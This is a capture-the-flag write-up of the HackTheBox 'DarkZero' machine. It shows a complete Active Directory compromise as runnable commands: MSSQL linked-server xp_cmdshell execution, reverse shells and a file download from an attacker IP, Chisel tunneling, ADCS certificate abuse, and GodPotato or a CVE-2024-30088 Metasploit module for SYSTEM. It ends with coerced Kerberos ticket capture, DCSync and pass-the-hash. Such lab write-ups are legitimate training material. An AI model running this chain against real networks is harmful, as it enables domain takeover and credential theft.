# DarkZero — HackTheBox Writeup

**Difficulty:** Hard  
**Category:** Active Directory  
**Target IP:** `10.129.xx.xx`

---

## Table of Contents

1. [Enumeration](#enumeration)
2. [MSSQL Access & Linked Server Discovery](#mssql-access--linked-server-discovery)
3. [Remote Code Execution on DC02](#remote-code-execution-on-dc02)
4. [Intended Path: Privilege Escalation via SeImpersonatePrivilege](#intended-path-privilege-escalation-via-seimpersonateprivilege)
5. [Unintended Path: Kernel Exploit (CVE-2024-30088)](#unintended-path-kernel-exploit-cve-2024-30088)
6. [Cross-Domain Ticket Capture & Domain Compromise](#cross-domain-ticket-capture--domain-compromise)
7. [Step-by-Step Summary](#step-by-step-summary)

---

## Credentials Provided

```
Username: john.w
Password: <REDACTED>
```

---

## Enumeration

### Nmap Scan

```bash
nmap -sV -sC 10.129.xx.xx
```

**Key open ports:**

| Port | Service | Details |
|------|---------|---------|
| 53 | DNS | Simple DNS Plus |
| 88 | Kerberos | Microsoft Windows Kerberos |
| 389 / 636 | LDAP / LDAPS | Domain: `darkzero.htb` |
| 445 | SMB | Message signing enabled and required |
| 1433 | MSSQL | Microsoft SQL Server 2022 RTM (16.0.1000) |
| 3268 / 3269 | GC LDAP | Global Catalog |
| 5985 | WinRM | Microsoft HTTPAPI 2.0 |

The machine is a Domain Controller: `DC01.darkzero.htb`  
OS: Windows Server 2025 Build 26100

### /etc/hosts Configuration

```
10.129.xx.xx    darkzero.htb dc01.darkzero.htb
172.16.20.2     darkzero.ext DC02.darkzero.ext
```

### WinRM Check

```bash
nxc winrm 10.129.xx.xx -u 'john.w' -p '<REDACTED>'
```

Result: **Authentication failed** — no WinRM shell available with these credentials.

---

## MSSQL Access & Linked Server Discovery

### Connect to MSSQL

```bash
impacket-mssqlclient darkzero.htb/john.w:'<REDACTED>'@10.129.xx.xx -windows-auth
```

We successfully authenticate and land as `guest` in the `master` database:

```
SQL (darkzero\john.w  guest@master)>
```

### Enumerate Linked Servers

```sql
enum_links
```

Output reveals a critical linked server configuration:

| Server | Provider | Linked As |
|--------|---------|-----------|
| DC01 | SQLNCLI | (self) |
| DC02.darkzero.ext | SQLNCLI | `dc01_sql_svc` |

> **Key Finding:** DC02 in an external domain (`darkzero.ext`) is reachable via linked server, and connections are established as `dc01_sql_svc`. Any command sent across this link executes with that service account's permissions on DC02.

---

## Remote Code Execution on DC02

### Use the Linked Server

```sql
use_link [DC02.darkzero.ext]
enable_xp_cmdshell
xp_cmdshell whoami
```

Output:
```
darkzero-ext\svc_sql
```

We have RCE on DC02 as `darkzero-ext\svc_sql`.

### Get a Reverse Shell

Start a listener on the attacker machine:

```bash
penelope -p 4444
```

Execute a Base64-encoded PowerShell payload via xp_cmdshell:

```sql
xp_cmdshell "powershell -e <BASE64_PAYLOAD>"
```

A reverse shell is received on port 4444 as `darkzero-ext\svc_sql`.

### Check Privileges

```powershell
whoami /all
```

Notable findings:
- **Integrity Level:** High Mandatory Level
- **Group:** `NT SERVICE\MSSQLSERVER`
- **Limited privileges** in the current shell context

---

## Intended Path: Privilege Escalation via SeImpersonatePrivilege

### Step 1 — Obtain a Delegated TGT with Rubeus

```powershell
.\Rubeus.exe tgtdeleg /nowrap
```

This extracts a delegated TGT for `svc_sql` in the `darkzero.ext` domain (base64 kirbi ticket).

### Step 2 — Convert the Ticket

On the attacker machine:

```bash
echo "<BASE64_TICKET>" | base64 -d > svc_sql.kirbi
impacket-ticketConverter svc_sql.kirbi svc_sql.ccache
```

### Step 3 — Set Up a SOCKS Tunnel via Chisel

On the attacker machine (server):

```bash
chisel server -p 8000 --reverse
```

On DC02 (client):

```powershell
.\chisel.exe client 10.10.xx.xx:8000 R:socks
```

Proxychains is now tunneled through DC02 at `127.0.0.1:1080`.

### Step 4 — Request a Certificate via ADCS (Certipy)

```bash
proxychains certipy req -u svc_sql -k -no-pass \
  -dc-host DC02.darkzero.ext \
  -target DC02.darkzero.ext \
  -ca darkzero-ext-DC02-CA \
  -template user
```

Certificate saved as `svc_sql.pfx` with UPN `svc_sql@darkzero.ext`.

### Step 5 — Authenticate with the Certificate & Recover NT Hash

```bash
proxychains certipy auth -pfx svc_sql.pfx -domain darkzero.ext -dc-ip 172.16.20.2
```

Output:
```
[*] Got TGT
[*] Got hash for 'svc_sql@darkzero.ext': aad3b435b51404eeaad3b435b51404ee:<REDACTED>
```

### Step 6 — Change the svc_sql Password

```bash
proxychains impacket-changepasswd \
  -hashes :<REDACTED> \
  -newpass <REDACTED> \
  darkzero.ext/svc_sql@dc02.darkzero.ext
```

Password changed successfully.

### Step 7 — Spawn Shell with SeImpersonatePrivilege via RunasCs

```powershell
.\RunasCs.exe svc_sql <REDACTED> "whoami /priv" --logon-type 5 --bypass-uac
```

Confirms `SeImpersonatePrivilege` is **Enabled**.

Get a reverse shell:

```powershell
.\RunasCs.exe svc_sql <REDACTED> cmd.exe -r 10.10.xx.xx:4445 --logon-type 5 --bypass-uac
```

### Step 8 — Escalate to SYSTEM via GodPotato

```powershell
.\GodPotato-NET4.exe -cmd "whoami"
```

Output confirms execution as `NT AUTHORITY\SYSTEM`.

Replace with a reverse shell payload to get a SYSTEM shell.

---

## Unintended Path: Kernel Exploit (CVE-2024-30088)

WinPEAS identified the target was running a vulnerable kernel version susceptible to **CVE-2024-30088** (Windows kernel privilege escalation).

### Exploit via Metasploit

```
use exploit/windows/local/cve_2024_30088_authz_basep
set SESSION <session_id>
set LHOST tun0
set LPORT 8390
run
```

Result:
```
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

> Note: May require multiple attempts to succeed.

### Grab the User Flag

```
type C:\Users\Administrator\Desktop\user.txt
<REDACTED>
```

---

## Cross-Domain Ticket Capture & Domain Compromise

Now running as SYSTEM on DC02, the goal is to capture a DC01 ticket and pivot back to the primary `darkzero.htb` domain.

### Step 1 — Monitor for Tickets with Rubeus on DC02

Download Rubeus to DC02:

```powershell
(New-Object System.Net.WebClient).DownloadFile('http://10.10.xx.xx/Rubeus.exe','C:\Users\Public\Rubeus.exe')
```

Start monitoring:

```powershell
C:\Users\Public\Rubeus.exe monitor /interval:1 /nowrap
```

### Step 2 — Force DC01 to Authenticate to DC02

From the MSSQL session on DC01:

```sql
xp_dirtree \\DC02.darkzero.ext\test
```

This forces DC01 to authenticate against DC02, causing Rubeus to capture the ticket.

### Step 3 — Capture the DC01$ TGT

Rubeus captures:

```
User: DC01$@DARKZERO.HTB
Flags: forwardable, renewable, forwarded
Base64EncodedTicket: doIFjDCCBYig...
```

### Step 4 — Convert the Ticket

On the attacker machine:

```bash
echo "<BASE64_DC01_TICKET>" > dc01_ticket.b64
cat dc01_ticket.b64 | base64 -d > dc01_ticket.kirbi
impacket-ticketConverter dc01_ticket.kirbi dc01_admin.ccache
```

### Step 5 — Dump Domain Credentials (DCSync)

```bash
export KRB5CCNAME=$(pwd)/dc01_admin.ccache

impacket-secretsdump -k -no-pass -just-dc \
  -target-ip 10.129.xx.xx \
  'darkzero.htb/DC01$@DC01.darkzero.htb'
```

Administrator NTLM hash recovered:

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:<REDACTED>:::
```

### Step 6 — Login as Administrator via Evil-WinRM

```bash
evil-winrm -i 10.129.xx.xx -u administrator -H <REDACTED>
```

Shell obtained as `Administrator` on DC01.

### Flags

```powershell
type C:\Users\Administrator\Desktop\user.txt
<REDACTED>

type C:\Users\Administrator\Desktop\root.txt
<REDACTED>
```

---

## Step-by-Step Summary

### Phase 1 — Initial Access

1. **Nmap scan** reveals standard AD services plus MSSQL (1433) and WinRM (5985) on DC01 (`10.129.xx.xx`).
2. **WinRM login** attempted with provided credentials (`john.w`) — fails.
3. **MSSQL login** succeeds via `impacket-mssqlclient` with Windows authentication — lands as `guest`.

### Phase 2 — Linked Server Exploitation

4. `enum_links` reveals a **linked server** pointing to `DC02.darkzero.ext` (external domain), with connections mapped to service account `dc01_sql_svc`.
5. Switch to the linked server with `use_link [DC02.darkzero.ext]` and enable `xp_cmdshell`.
6. Confirm RCE as `darkzero-ext\svc_sql` on DC02 via `xp_cmdshell whoami`.
7. Execute a Base64-encoded PowerShell reverse shell payload — receive shell via **Penelope** listener on port 4444.

### Phase 3 — Foothold on DC02

8. `whoami /all` confirms **High Mandatory Level** but limited privileges in the current token context.
9. Use **Rubeus tgtdeleg** to extract a delegated TGT for `svc_sql`.
10. Convert the Kerberos ticket: `kirbi → ccache` using `impacket-ticketConverter`.
11. Deploy **Chisel** for SOCKS tunneling: attacker acts as server, DC02 as client — enables proxychains routing through the internal network.

### Phase 4 — ADCS Certificate Abuse & Hash Recovery

12. Via proxychains, use **Certipy** to request a user certificate from the `darkzero-ext-DC02-CA` using the `user` template, authenticated as `svc_sql`.
13. Authenticate with the certificate via `certipy auth` — retrieve a TGT and the **NTLM hash** for `svc_sql`.
14. Use `impacket-changepasswd` to change `svc_sql`'s password, enabling interactive logon.

### Phase 5 — Privilege Escalation to SYSTEM (Intended)

15. Use **RunasCs** with `--logon-type 5` to run as `svc_sql` with a proper logon session — confirms `SeImpersonatePrivilege` is enabled.
16. Use RunasCs to spawn a reverse shell on port 4445 as `svc_sql`.
17. Exploit **SeImpersonatePrivilege** with **GodPotato** (`-NET4`) to escalate to `NT AUTHORITY\SYSTEM` on DC02.

### Phase 5 (Alt) — Privilege Escalation via Kernel Exploit (Unintended)

15. **WinPEAS** identifies the kernel is vulnerable to **CVE-2024-30088**.
16. Use the Metasploit module `exploit/windows/local/cve_2024_30088_authz_basep` against an existing session — escalates to `NT AUTHORITY\SYSTEM`.

### Phase 6 — Cross-Domain Pivot & Full Compromise of darkzero.htb

17. Download and run **Rubeus monitor** on DC02 (as SYSTEM) to watch for incoming Kerberos tickets.
18. From the original MSSQL session on DC01, trigger `xp_dirtree \\DC02.darkzero.ext\test` — this forces **DC01 to authenticate to DC02**, causing Rubeus to intercept a TGT for `DC01$@DARKZERO.HTB`.
19. Copy the Base64 ticket from Rubeus output, decode and convert it: `kirbi → ccache`.
20. Export the ccache as `KRB5CCNAME` and run **impacket-secretsdump** with `-k` (Kerberos auth) against DC01 — performing a **DCSync attack** and dumping all domain hashes including `Administrator`.
21. Use **Evil-WinRM** with the Administrator NTLM hash to get a shell on DC01 (`10.129.xx.xx`).
22. Read `user.txt` and `root.txt` from `C:\Users\Administrator\Desktop\`.

---

### Tools Used

| Tool | Purpose |
|------|---------|
| Nmap | Network/service enumeration |
| NetExec (nxc) | WinRM/SMB credential testing |
| impacket-mssqlclient | MSSQL access via Windows auth |
| Penelope | Reverse shell listener |
| Rubeus | TGT delegation, ticket monitoring |
| impacket-ticketConverter | kirbi → ccache conversion |
| Chisel | SOCKS tunnel / network pivot |
| Certipy | ADCS certificate request & auth |
| impacket-changepasswd | Password change over RPC |
| RunasCs | Run commands as another user with logon session |
| GodPotato | SeImpersonatePrivilege → SYSTEM |
| Metasploit (CVE-2024-30088) | Kernel privilege escalation |
| impacket-secretsdump | DCSync / domain credential dump |
| Evil-WinRM | WinRM shell with pass-the-hash |

---

### Key Vulnerability Chain

```
MSSQL Guest Access
        ↓
Linked Server to External Domain (DC02.darkzero.ext)
        ↓
RCE as svc_sql via xp_cmdshell
        ↓
TGT Delegation (Rubeus) + SOCKS Tunnel (Chisel)
        ↓
ADCS Certificate Abuse → NTLM Hash Recovery
        ↓
SeImpersonatePrivilege → SYSTEM via GodPotato
   (or CVE-2024-30088 Kernel Exploit)
        ↓
Rubeus TGT Monitor → Capture DC01$ Ticket via xp_dirtree
        ↓
DCSync with DC01$ Ticket → Administrator Hash
        ↓
Pass-the-Hash → Domain Admin on darkzero.htb
```
